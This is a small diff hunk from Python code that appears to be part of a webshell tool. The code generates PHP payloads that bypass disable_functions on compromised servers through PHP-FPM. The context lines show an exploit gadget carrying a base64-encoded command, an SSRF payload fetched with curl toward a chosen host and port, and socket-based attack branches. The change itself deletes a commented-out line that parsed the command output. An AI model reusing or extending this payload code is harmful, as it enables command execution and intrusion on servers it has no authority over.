@@ -1606,7 +1606,6 @@ $dlls[0]->offsetUnset(0);""" % (print_command, base64_encode(command))
                 curl_close($ch);
 }
 ob_start();curl("%s");$fpm_r=ob_get_clean();
-//$fpm_r=explode(urldecode('%%0a'),$fpm_r);$fpm_r=array_slice($fpm_r,3);$fpm_r=implode("\\n",$fpm_r);$fpm_r=explode(urldecode('%%00'),$fpm_r);$fpm_r=array_slice($fpm_r,0,1);print(current($fpm_r));
 """ % generate_ssrf_payload(host, port, ext_upload_path)
         elif attack_type in ["sock", "http_sock"]:
             sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")
